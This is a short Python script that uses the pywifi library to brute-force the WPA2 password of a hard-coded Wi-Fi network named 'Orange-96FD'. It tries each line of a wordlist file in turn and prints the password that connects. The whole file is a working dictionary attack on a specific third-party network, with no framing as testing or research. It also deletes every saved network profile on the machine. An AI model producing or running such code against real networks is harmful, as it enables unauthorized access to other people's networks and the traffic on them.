import pywifi
from pywifi import PyWiFi
from pywifi import const
from pywifi import Profile
import time
try:
    wifi=PyWiFi()
    INF=wifi.interfaces()[0]
    INF.scan()
    Rscan=INF.scan_result()
    print(Rscan)
except:
    print("no INF X")

def main(SSID,PASSWORD):
    prof=Profile()
    prof.ssid=SSID
    prof.auth=const.AUTH_ALG_OPEN
    prof.akm.append(const.AKM_TYPE_WPA2PSK)
    prof.cipher=const.CIPHER_TYPE_CCMP
    prof.key=PASSWORD
    INF.remove_all_network_profiles()
    TEMP_PROF=INF.add_network_profile(prof)
    time.sleep(0.1)
    INF.connect(TEMP_PROF)
    time.sleep(0.1)
    if INF.status()==4:
        time.sleep(0.1)
        print("is true ===>",PASSWORD,"<===")
        exit()
    else:
        print("is false ===>",PASSWORD,"<===")

def RUNIT():
    for i in open("ps.txt","+r").readlines():
        i=i.strip('\n')   
       
        main("Orange-96FD",i)
       
       


RUNIT()



 